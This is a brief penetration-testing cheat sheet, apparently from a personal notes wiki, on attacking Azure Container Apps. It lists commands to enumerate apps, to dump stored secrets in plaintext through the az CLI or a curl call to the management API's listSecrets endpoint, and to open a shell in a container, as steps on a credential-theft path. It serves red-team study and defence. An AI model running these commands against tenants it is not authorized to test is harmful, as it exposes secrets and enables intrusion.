

## Identify container apps
___
[[resource_enumeration]]

### Enumerate
----

**General info** (Also shows environment variables!)
```bash
az containerapp show --name <containerapp> --resource-group <group>
```

### Exploit
---
**Secrets**
```bash
az containerapp secret list -n <containerapp> -g <group> --show-values
```
or with curl
```bash
armtoken="accesstoken"

curl -X POST "https://management.azure.com/subscriptions/<TENTANTID>/resourceGroups/<GROUP>/providers/Microsoft.App/containerApps/<CONTAINERNAME>/listSecrets?api-version=2024-03-01" \
-H "Authorization: Bearer $armtoken" \
-H "Content-Type: application/json" \
-H "Content-Length: 0"
```


**Execute command**
```bash
az containerapp exec --name <containerapp> --resource-group <group>
```
After execution: [[managed_identity_and_apps]]



